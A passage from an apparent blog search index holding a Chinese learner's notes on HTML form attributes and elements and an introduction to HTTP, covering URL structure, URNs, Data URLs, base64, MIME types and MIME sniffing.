[autocomplete](http://www.w3school.com.cn/tags/att_form_autocomplete.asp) | 规定表单是否应打开自动完成（填写）功能。                     || [enctype](http://www.w3school.com.cn/tags/att_form_enctype.asp) | 规定将表单数据提交到服务器时应如何编码（仅供 method="post"）。 || [method](http://www.w3school.com.cn/tags/att_form_method.asp) | 规定发送表单数据时要使用的 HTTP 方法。                       || [name](http://www.w3school.com.cn/tags/att_form_name.asp)    | 规定表单名称。                                               || [novalidate](http://www.w3school.com.cn/tags/att_form_novalidate.asp) | 规定提交时不应验证表单。                                     || [rel](http://www.w3school.com.cn/tags/att_form_rel.asp)      | 规定链接资源和当前文档之间的关系。                           || [target](http://www.w3school.com.cn/tags/att_form_target.asp) | 规定提交表单后在何处显示接收到的响应。                       |target属性有下值：| _blank    | 响应显示在新窗口或选项卡中。   || --------- | ------------------------------ || _self     | 响应显示在当前窗口中。         || _parent   | 响应显示在父框架中。           || _top      | 响应显示在窗口的整个 body 中。 || framename | 响应显示在命名的 iframe 中。   |例子：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action_page.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">accept-charset</span>=<span class="string">&quot;UTF-8&quot;</span></span><span class="tag"><span class="attr">ectype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">novalidate</span>&gt;</span>.form elements .<span class="tag">&lt;/<span class="name">form</span>&gt;</span></code></pre>get与post简单提醒：关于 GET 的注意事项：- 以名称/值对的形式将表单数据追加到 URL- 永远不要使用 GET 发送敏感数据！（提交的表单数据在 URL 中可见！）- URL 的长度受到限制（2048 个字符）- 对于用户希望将结果添加为书签的表单提交很有用- GET 适用于非安全数据，例如 Google 中的查询字符串关于 POST 的注意事项：- 将表单数据附加在 HTTP 请求的正文中（不在 URL 中显示提交的表单数据）- POST 没有大小限制，可用于发送大量数据。- 带有 POST 的表单提交无法添加书签**提示：**如果表单数据包含敏感信息或个人信息，请务必使用 POST附：novalidate深究：[深入探究novalidate_笔记大全_设计学院 (python100.com)](https://www.python100.com/html/74598.html)#### 2.表单元素：< input >：属性有type，name， value。< input > 元素根据不同的 *type* 属性，可以变化为多种形态。< select >：例子：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;cars&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;volvo&quot;</span>&gt;</span>Volvo<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;saab&quot;</span>&gt;</span>Saab<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;fiat&quot;</span>&gt;</span>Fiat<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;audi&quot;</span>&gt;</span>Audi<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></code></pre>name类似于键，value类似于值。*<option>* 元素定义待选择的选项。列表通常会把首个选项显示为被选选项。您能够通过添加 selected 属性来定义预定义选项。< textarea >：该元素定义多行输入字段（*文本域*），如下例：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span>&gt;</span>The cat was playing in the garden.<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></code></pre>< button >：该元素定义可点击的按钮，如下例：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Hello World!&#x27;)&quot;</span>&gt;</span>Click Me!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></code></pre>< datalist >：预定义选项，如下例：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action_page.php&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">list</span>=<span class="string">&quot;browsers&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">&quot;browsers&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Internet Explorer&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Firefox&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Chrome&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Opera&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Safari&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">datalist</span>&gt;</span> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></code></pre>#### 3.输入类型：link:[HTML 输入类型 (w3school.com.cn)](http://www.w3school.com.cn/html/html_form_input_types.asp)#### 4.input表单属性：value, readonly, disabled(禁用)等等link:[HTML Input 属性 (w3school.com.cn)](http://www.w3school.com.cn/html/html_form_attributes.asp)]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP入门</title>
      <link href="/2024/03/18/HTTP%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/HTTP%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP入门"><a href="#HTTP入门" class="headerlink" title="HTTP入门"></a>HTTP入门</h1><h2 id="资源和URI"><a href="#资源和URI" class="headerlink" title="资源和URI"></a>资源和URI</h2><p>引入：HTTP 请求的内容通称为“资源”。”资源”这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 （<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/URI">URI）</a> 来进行标识。</p><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>URL(统一资源定位符)(Uniform Resource Locator)</p><p>URL又被称为Web地址，语法如下：</p><p><a href="http://www.example.com:port/path/to/file/?key1=1&key2=2#somewhere">http://www.example.com:port/path/to/file/?key1=1&amp;key2=2#somewhere</a></p><p>解析：</p><h4 id="1-protocol-方案或协议"><a href="#1-protocol-方案或协议" class="headerlink" title="1.protocol(方案或协议)"></a>1.protocol(方案或协议)</h4><p>常见的有http，https，具体如下表：</p><table><thead><tr><th align="left">方案</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">数据</td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URLs">数据 URI</a></td></tr><tr><td align="left">文件</td><td align="left">指定主机上文件的名称</td></tr><tr><td align="left">FTP协议</td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/FTP">文件传输协议</a></td></tr><tr><td align="left">HTTP&#x2F;HTTPS协议</td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP">超文本传输 协议／安全的超文本传输协议</a></td></tr><tr><td align="left">mail至</td><td align="left">电子邮件地址</td></tr><tr><td align="left">SSH的</td><td align="left">安全 shell</td></tr><tr><td align="left">电话</td><td align="left">电话</td></tr><tr><td align="left">瓮</td><td align="left">统一资源名称</td></tr><tr><td align="left">查看源代码</td><td align="left">资源的源代码</td></tr><tr><td align="left">WS&#x2F;WSS</td><td align="left">（加密的）<a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">WebSocket （en-US）</a> 连接</td></tr></tbody></table><h4 id="2-主机"><a href="#2-主机" class="headerlink" title="2.主机"></a>2.主机</h4><p>Domain Name(域名)：<a href="http://www.example.com/">www.example.com</a></p><blockquote><p><code>www.example.com</code>既是一个域名，也代表管理该域名的机构。它指示了需要向网络上的哪一台主机发起请求。当然，也可以直接向主机的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/IP_Address">IP address</a> 地址发起请求。但直接使用 IP 地址的场景并不常见。</p></blockquote><h4 id="3-端口-port"><a href="#3-端口-port" class="headerlink" title="3.端口(port)"></a>3.端口(port)</h4><blockquote><p>port表示用于访问 Web 服务器上资源的技术“门”。如果访问的该 Web 服务器使用 HTTP 协议的标准端口（HTTP 为 80，HTTPS 为 443）授予对其资源的访问权限，则通常省略此部分。否则端口就是 URI 必须的部分。</p></blockquote><h4 id="4-路径-path"><a href="#4-路径-path" class="headerlink" title="4.路径(path)"></a>4.路径(path)</h4><p>&#x2F;pah&#x2F;to&#x2F;file</p><blockquote><p><code>/path/to/myfile.html</code>是 Web 服务器上资源的路径。在 Web 的早期，类似这样的路径表示 Web 服务器上的物理文件位置。现在，它主要是由没有任何物理实体的 Web 服务器抽象处理而成的。</p></blockquote><h4 id="5-查询-参数"><a href="#5-查询-参数" class="headerlink" title="5.查询(参数)"></a>5.查询(参数)</h4><p>?key1&#x3D;1&amp;key2&#x3D;2</p><blockquote><p><code>?key1=value1&amp;key2=value2</code>是提供给 Web 服务器的额外参数。这些参数是用 &amp; 符号分隔的键&#x2F;值对列表。Web 服务器可以在将资源返回给用户之前使用这些参数来执行额外的操作。每个 Web 服务器都有自己的参数规则，想知道特定 Web 服务器如何处理参数的唯一可靠方法是询问该 Web 服务器所有者。</p></blockquote><h4 id="6-片段"><a href="#6-片段" class="headerlink" title="6.片段"></a>6.片段</h4><p>#somewhere</p><blockquote><p>是资源本身的某一部分的一个锚点。锚点代表资源内的一种”书签”，它给予浏览器显示位于该”加书签”点的内容的指示。例如，在 HTML 文档上，浏览器将滚动到定义锚点的那个点上；在视频或音频文档上，浏览器将转到锚点代表的那个时间。值得注意的是 # 号后面的部分，也称为片段标识符，永远不会与请求一起发送到服务器。</p></blockquote><p>举几个例子：</p><pre><code class="highlight plaintext">https://developer.mozilla.org/zh-CN/docs/Learntel:+1-816-555-1212git@github.com:mdn/browser-compat-data.gitftp://example.org/resource.txturn:isbn:9780141036144</code></pre><h3 id="URN"><a href="#URN" class="headerlink" title="URN"></a>URN</h3><p>URN全称为Uniform Resource Name(统一资源名称)，URN 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。</p><pre><code class="highlight plaintext">urn:isbn:9780141036144urn:ietf:rfc:7230</code></pre><p>上面两个 URN 标识了下面的资源：</p><ul><li>乔治·奥威尔所著的《1984》</li><li>IETF 规范 7230，超文本传输 协议 (HTTP&#x2F;1.1)：Message Syntax and Routing.</li></ul><h3 id="Data-URL"><a href="#Data-URL" class="headerlink" title="Data URL"></a>Data URL</h3><h4 id="Ⅰ-简介"><a href="#Ⅰ-简介" class="headerlink" title="Ⅰ. 简介"></a>Ⅰ. 简介</h4><blockquote><p><strong>Data URL</strong>，即前缀为 <code>data:</code> 协议的 URL，其允许内容创建者向文档中嵌入小文件。它们之前被称作“data URI”，直到这个名字被 WHATWG 弃用。</p></blockquote><p>语法：data:[<mediatype>][;base64],<data></p><p>Data URL 由四个部分组成：前缀（<code>data:</code>）、指示数据类型的 MIME 类型、如果非文本则为可选的 <code>base64</code> 标记、数据本身：</p><p>data:text&#x2F;plain;base64,Hello World</p><h4 id="Ⅱ-对数据base64编码"><a href="#Ⅱ-对数据base64编码" class="headerlink" title="Ⅱ.对数据base64编码"></a>Ⅱ.对数据base64编码</h4><p>简介</p><blockquote><p>Base64 是一组二进制到文本的编码方案，通过将其转换为 radix-64 表示形式，以 ASCII 字符串格式表示二进制数据。通过仅由 ASCII 字符组成，base64 字符串通常是 url 安全的，这就是为什么它们可用于在 Data URL 中编码数据。</p></blockquote><p>作用：</p><blockquote><p>Base64 编码方案通常用于需要对二进制数据进行编码的情况，这些数据需要通过设计用于处理 ASCII 的媒体进行存储和传输。这样是为了保证数据的完整并且不用在传输过程中修改这些数据。Base64 也被一些应用（包括使用 <a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%94%A8%E9%80%94%E4%BA%92%E8%81%AF%E7%B6%B2%E9%83%B5%E4%BB%B6%E6%93%B4%E5%B1%95">MIME</a> 的电子邮件）和在 <a href="https://developer.mozilla.org/zh-CN/docs/Web/XML">XML</a> 中储存复杂数据时使用。</p></blockquote><p>简单来说，信息从二进制方式变成文本方式</p><blockquote><p>Base64 编码在网络上的一个常见应用是对二进制数据进行编码，以便将其纳入 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URLs">data: URL</a> 中。</p></blockquote><p>附：Unicode： Unicode 是一个字符集，为世界上几乎所有的字符提供了唯一的标识符（Code Point）。</p><p>​UTF-8：UTF-8（Unicode Transformation Format - 8-bit）是一种编码方案，用于在计算机系统中以字节的形式表示 Unicode 中的字符。</p><p>关系：<br>Unicode 和 UTF-8 是两个相关但不同的概念，它们在字符编码领域有着密切的关系。</p><ol><li><strong>Unicode：</strong><ul><li><strong>定义：</strong> Unicode 是一个字符集，为世界上几乎所有的字符提供了唯一的标识符（Code Point）。</li><li><strong>特点：</strong> Unicode 提供了一个标准化的方式来表示和处理不同语言和符号的字符，以实现统一的字符编码方案。</li><li><strong>表示方式：</strong> Unicode 中的每个字符都有一个唯一的编号，称为 Code Point，通常用 U+XXXX 的形式表示，其中 “XXXX” 是十六进制的数字。</li></ul></li><li><strong>UTF-8：</strong><ul><li><strong>定义：</strong> UTF-8（Unicode Transformation Format - 8-bit）是一种编码方案，用于在计算机系统中以字节的形式表示 Unicode 中的字符。</li><li><strong>特点：</strong> UTF-8 是一种可变长度的编码方案，能够表示 Unicode 中的所有字符，但对于 ASCII 字符，它只需要一个字节，这使得它在存储和传输时更为高效。</li><li><strong>编码规则：</strong> UTF-8 的编码规则是根据字符的 Unicode Code Point 来确定不同长度的字节序列。</li></ul></li></ol><p><strong>关系：</strong></p><ul><li>Unicode 定义了字符集和每个字符的唯一标识（Code Point）。</li><li>UTF-8 是 Unicode 的一种实现方式，是一种将 Unicode 字符编码为字节序列的方法，可以在计算机系统中存储和传输文本数据。</li></ul><h3 id="MIME-类型（IANA-媒体类型）"><a href="#MIME-类型（IANA-媒体类型）" class="headerlink" title="MIME 类型（IANA 媒体类型）"></a>MIME 类型（IANA 媒体类型）</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote><p><strong>媒体类型</strong>（也通常称为<strong>多用途互联网邮件扩展</strong>或 <strong>MIME</strong> 类型）是一种标准，用来表示文档、文件或一组数据的性质和格式。它在 IETF 的 <a href="https://datatracker.ietf.org/doc/html/rfc6838">RFC 6838</a> 中进行了定义和标准化。</p></blockquote><p>附：IANA：互联网号码分配局，负责跟踪所有官方 MIME 类型。</p><h4 id="MIME结构"><a href="#MIME结构" class="headerlink" title="MIME结构"></a>MIME结构</h4><p>1.MIME 类型通常仅包含两个部分：<em>类型</em>（type）和<em>子类型</em>（subtype），中间由斜杠 <code>/</code> 分割，中间没有空白字符：</p><p>结构：<code>type/subtype</code></p><ul><li><strong>类型(type)<strong>：表示数据的大致分类，如</strong>video</strong>或<strong>text</strong></li><li>**子类型(subtype)**：MIME 类型所代表的指定类型的确切数据类型。以 <code>text</code> 类型为例，它的子类型包括：<code>plain</code>（纯文本）、<code>html</code>（<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTML">HTML</a> 源代码）、<code>calender</code>（iCalendar&#x2F;<code>.ics</code> 文件）。</li></ul><p>2.结构里允许参数</p><pre><code class="highlight plaintext">type/subtype;parameter=value</code></pre><blockquote><p>例如，对于主类型为 <code>text</code> 的任何 MIME 类型，可以添加可选的 <code>charset</code> 参数，以指定数据中的字符所使用的字符集。如果没有指定 <code>charset</code>，默认值为 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/ASCII">ASCII</a>（<code>US-ASCII</code>），除非被<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/User_agent">用户代理的</a>设置覆盖。要指定 UTF-8 文本文件，则使用 MIME 类型 <code>text/plain;charset=UTF-8</code>。</p></blockquote><p>附：UTF-8完美兼容ASCII字符</p><p>3.MIME类型有两类：<strong>独立的</strong>（discrete）和<strong>多部分的</strong>（multipart）。</p><p>独立类型（IANA目前已注册的）</p><ul><li>application：不明确属于其他类型之一的任何二进制数据。</li><li>audio：音频或音乐数据。常见的示例如 <code>audio/mpeg</code>、<code>audio/vorbis</code>。</li><li>example：在演示如何使用 MIME 类型的示例中用作占位符的保留类型。也可以作为子类型。</li><li>font：字体&#x2F;字型数据。常见的示例如 <code>font/woff</code>、<code>font/ttf</code> 和 <code>font/otf</code>。</li><li>image：图像或图形数据，常见的例子有 <code>image/jpeg</code>、<code>image/png</code> 和 <code>image/svg+xml</code>。</li><li>model：三维物体或场景的模型数据。示例包含 <code>model/3mf</code> 和 <code>model/vrml</code>。</li><li>text：纯文本数据，示例包含：<code>text/plain</code>、<code>text/csv</code> 和 <code>text/html</code>。</li><li>video：视频数据或文件，例如 MP4 电影（<code>video/mp4</code>）。</li></ul><p>多部分类型</p><blockquote><p><strong>多部分</strong>类型指的是一类可分成不同部分的文件，其各部分通常是不同的 MIME 类型；也可用于——尤其在电子邮件中——表示属于同一事务的多个独立文件。它们代表一个<strong>复合文档</strong>。</p></blockquote><p>有两种多部分类型(初学没有深入了解)：</p><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#message"><code>message</code></a></p><p>封装其他信息的信息。例如，这可以用来表示将转发信息作为其数据一部分的电子邮件，或将超大信息分块发送，就像发送多条信息一样。例如，<code>message/rfc822</code>（用于转发或回复信息的引用）和 <code>message/partial</code>（允许将大段信息自动拆分成小段，由收件人重新组装）是两个常见的例子。（<a href="https://www.iana.org/assignments/media-types/media-types.xhtml#message">查看 IANA 上 message 类型的注册表</a>）</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_Types#multipart"><code>multipart</code></a></p><p>由多个组件组成的数据，这些组件可能各自具有不同的 MIME 类型。例如，<code>multipart/form-data</code>（用于使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/FormData"><code>FormData</code></a> API 生成的数据）和 <code>multipart/byteranges</code>（定义于 <a href="https://datatracker.ietf.org/doc/html/rfc7233#section-5.4.1">RFC 7233, section 5.4.1</a>，当获取到的数据仅为部分内容时——如使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range"><code>Range</code></a> 标头传输的内容——与返回的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP">HTTP</a> 响应 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/206"><code>206</code></a> “Partial Content”组合使用）。（<a href="https://www.iana.org/assignments/media-types/media-types.xhtml#multipart">查看 IANA 上 multipart 类型的注册表</a>）</p></blockquote><h4 id="对Web开发者至关重要的MIME类型"><a href="#对Web开发者至关重要的MIME类型" class="headerlink" title="对Web开发者至关重要的MIME类型"></a>对Web开发者至关重要的MIME类型</h4><p><strong>application&#x2F;octet-stream</strong></p><blockquote><p>这是二进制文件的默认值.。由于这意味着<em>未知的二进制文件</em>，浏览器一般不会自动执行或询问执行。</p></blockquote><p><strong>text&#x2F;plain</strong></p><blockquote><p>这是文本文件的默认值。即使它其实意味着<em>未知的文本文件</em>，但浏览器认为是可以直接展示的。</p></blockquote><p>text&#x2F;css</p><blockquote><p>在网页中要被解析为 CSS 的任何 CSS 文件<strong>必须</strong>指定 MIME 为 <code>text/css</code>。通常，如果服务器不识别 CSS 文件的 <code>.css</code> 后缀，则可能将它们以 MIME 为 <code>text/plain</code> 或 <code>application/octet-stream</code> 来发送给浏览器：在这种情况下，大多数浏览器不将其识别为 CSS 文件而直接忽略。</p></blockquote><p>text&#x2F;html</p><blockquote><p>所有的 HTML 内容都应该使用这种类型。</p></blockquote><p>text&#x2F;javascript</p><blockquote><p>JavaScript 内容应始终使用 MIME 类型 <code>text/javascript</code> 提供。其他 MIME 类型对 JavaScript 无效，使用除 <code>text/javascript</code> 以外的任何 MIME 类型都可能导致脚本无法加载或运行。另外，。对于 JavaScript 内容来说，<code>charset</code> 参数无效，在大多数情况下会导致脚本加载失败。</p></blockquote><p>以下是常用的图像类型，可在网页中<em>安全</em>使用：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#apng_animated_portable_network_graphics"><code>image/apng</code></a>：动画便携式网络图形（APNG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#avif_%E5%9B%BE%E5%83%8F"><code>image/avif</code></a>：AV1 图像文件格式（AVIF）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#gif_graphics_interchange_format"><code>image/gif</code></a>：图形交换格式（GIF）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#jpeg_joint_photographic_experts_group_image"><code>image/jpeg</code></a>：联合图像专家小组图片（JPEG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#png_portable_network_graphics"><code>image/png</code></a>：便携式网络图形（PNG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#svg_scalable_vector_graphics"><code>image/svg+xml</code></a>：可缩放矢量图形（SVG）</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats/Image_types#webp_%E5%9B%BE%E5%83%8F"><code>image/webp</code></a>：Web 图像格式（WEBP）</li></ul><p><strong>multipart&#x2F;form-data</strong></p><p>multipart&#x2F;form-data可用于HTML表单发送信息给服务器</p><p>multipart&#x2F;byteranges</p><p><code>multipart/byteranges</code> 用于把部分的响应报文发送回浏览器。</p><h4 id="正确设置MIME类型"><a href="#正确设置MIME类型" class="headerlink" title="正确设置MIME类型"></a>正确设置MIME类型</h4><blockquote><p>很多 web 服务器使用默认的 <code>application/octet-stream</code> 来发送未知类型。出于一些安全原因，对于这些资源浏览器不允许设置一些自定义默认操作，强制用户必须存储到本地以使用。</p></blockquote><p>常见的导致服务器配置错误的文件类型如下所示：</p><ul><li>RAR 压缩文件。在这种情况，理想状态是，设置真实的编码文件类型；但这通常不可能，因为 .RAR 文件可能包含多种不同类型的资源。这种情况，将所发送文件的 MIME 类型配置为 <code>application/x-rar-compressed</code>。</li><li>音频或视频文件。只有正确设置了 MIME 类型的文件才能被 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video">&#96;&#96;</a> 或<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio">&#96;&#96;</a> 元素识别和播放。请确保指定了正确的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Media/Formats">音频和视频的媒体类型</a>。</li><li>专有文件类型。避免使用 <code>application/octet-stream</code>，对于这种一般的 MIME 类型浏览器不允许定义默认行为（比如“在 Word 中打开”）。像 <code>application/vnd.mspowerpoint</code> 这样的类型可以让用户选择自动在幻灯片软件中打开这样的文件。</li></ul><h4 id="MIME嗅探"><a href="#MIME嗅探" class="headerlink" title="MIME嗅探"></a>MIME嗅探</h4><blockquote><p>在缺失 MIME 类型或客户端认为文件设置了错误的 MIME 类型时，浏览器可能会通过查看资源来进行 <em>MIME 嗅探</em>。</p></blockquote><p>简单来说即是通过其他方法得知数据类型。</p><blockquote><p>由于某些 MIME 类型可能代表可执行内容，会存在一些安全问题。服务器可以通过发送 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Content-Type-Options"><code>X-Content-Type-Options</code></a> 标头来阻止 MIME 嗅探。</p></blockquote><p>可知MIME嗅探并非是一件好事，比如xss攻击等等，一些安全专业人士主张禁用或限制 MIME 嗅探，并强调在服务器端正确设置 “Content-Type” 标头以提供准确的文件类型信息。此外，使用 <code>X-Content-Type-Options</code> 头来控制浏览器是否进行 MIME 嗅探也是一种辅助措施。</p><h4 id="其他传送文件类型的方法"><a href="#其他传送文件类型的方法" class="headerlink" title="其他传送文件类型的方法"></a>其他传送文件类型的方法</h4><blockquote><ul><li>有时会使用名称后缀，特别是在 Microsoft Windows 系统上。并非所有的操作系统都认为这些后缀是有意义的（特别是 Linux 和 Mac OS），并且像外部 MIME 类型一样，不能保证它们是正确的。</li><li>魔数（magic number）。不同类型的文件的语法通过查看结构来允许文件类型推断。例如，每个 GIF 文件以 <code>47 49 46 38 39</code> 十六进制值（<code>GIF89</code>）开头，每个 PNG 文件以 <code>89 50 4E 47</code>（<code>.PNG</code>）开头。并非所有类型的文件都有魔数，所以这也不是 100％ 可靠的方式。</li></ul></blockquote><h2 id="HTTP指南"><a href="#HTTP指南" class="headerlink" title="HTTP指南"></a>HTTP指南</h2><h3 id="HTTP概述"><a href="#HTTP概述" class="headerlink" title="HTTP概述"></a>HTTP概述</h3><blockquote><p><strong>HTTP</strong> 是一种用作获取诸如 HTML 文档这类资源的<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Protocol">协议</a>。它是 Web 上进行任何数据交换的基础，同时，也是一种客户端—服务器（client-server）协议</p></blockquote><p>客户端和服务器之间通过HTTP协议通过交换一个个独立的消息（而非数据流）进行通信。客户端发出的消息称为<strong>请求（request）</strong>，服务端接收的应答消息称为<strong>响应（response）</strong>。</p><h4 id="基于HTTP的组件系统"><a href="#基于HTTP的组件系统" class="headerlink" title="基于HTTP的组件系统"></a>基于HTTP的组件系统</h4><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/client-server-chain-1706253428232-5.png" alt="客户端与服务器间的链条"></p><p>客户端(Client)：用户代理</p><blockquote><p><em>用户代理</em>是任何能够代表用户行为的工具。这类工具以浏览器为主，不过，它也可能是工程师和 Web 开发人员调试应用所使用的那些程序。</p></blockquote><p>一般情况下总是浏览器发起请求而非是服务端，不过后来加入了一些机制，能够模拟由服务端发出的消息。</p><p>Web服务端(Server)：</p><blockquote><p>在上述通信过程的另一侧是服务端，它<em>负责提供</em>客户端所请求的文档。一个服务端可以假装表现为仅有一台机器，但实际上，它可以是共享负载的一组服务器集群（负载均衡）或是其他类型的软件（如缓存、数据库服务、电商服务等），按需完整或部分地生成文档。</p></blockquote><p>此外，一个服务器可以不仅仅只有一台机器，而多个服务端软件实例也可部署在同一台机器上。</p><p>代理：</p><blockquote><p>在浏览器和服务器之间，有许多计算机和设备参与传递了 HTTP 消息。依靠 Web 技术栈的层次化的结构，传递过程中的多数操作都位于传输层、网络层或物理层，它们对于 HTTP 应用层而言就是透明的，并默默地对网络性能产生着重要影响。还有一部分实体在应用层参与消息传递，一般被称为<strong>代理</strong>（Proxy）。代理可以是透明的，即转发它们收到的请求并不做任何修改，也可以表现得不透明，将它传递给服务端之前使用一些手段修改这个请求。代理可以发挥很多种作用：</p></blockquote><blockquote><ul><li>缓存（可以是公开的也可以是私有的，如浏览器的缓存）</li><li>过滤（如反病毒扫描、家长控制…）</li><li>负载均衡（让多个服务器服务不同的请求）</li><li>认证（控制对不同资源的访问）</li><li>日志（使得代理可以存储历史信息）</li></ul></blockquote><h4 id="HTTP的基本性质"><a href="#HTTP的基本性质" class="headerlink" title="HTTP的基本性质"></a>HTTP的基本性质</h4><ul><li>HTTP是简约的</li><li>HTTP是可扩展的：HTTP标头（header）</li><li>HTTP无状态，但并非无回会话</li><li>HTTP和网络连接</li></ul><h4 id="HTTP报文"><a href="#HTTP报文" class="headerlink" title="HTTP报文"></a>HTTP报文</h4><blockquote><p>HTTP&#x2F;1.1 以及更早的 HTTP 协议报文都是语义可读的。在 HTTP&#x2F;2 中，这些报文被嵌入到了一个新的二进制结构，帧。帧允许实现很多优化，比如报文标头的压缩以及多路复用。即使只有原始 HTTP 报文的一部分以 HTTP&#x2F;2 发送出来，每条报文的语义依旧不变，客户端会重组原始 HTTP&#x2F;1.1 请求。因此用 HTTP&#x2F;1.1 格式来理解 HTTP&#x2F;2 报文仍旧有效。</p></blockquote><p>请求报文：<img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/http_request.png" alt="一个基础的 HTTP 请求"></p><ol><li>一个HTTP方法，可以是GET，POST等等，以此定义客户端执行的操作</li><li>要获取的资源的路径</li><li>HTTP协议版本号</li><li>请求头，又称为HTTP标头</li><li>请求体</li></ol><p>响应报文：<img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/http_response.png" alt="HTTP 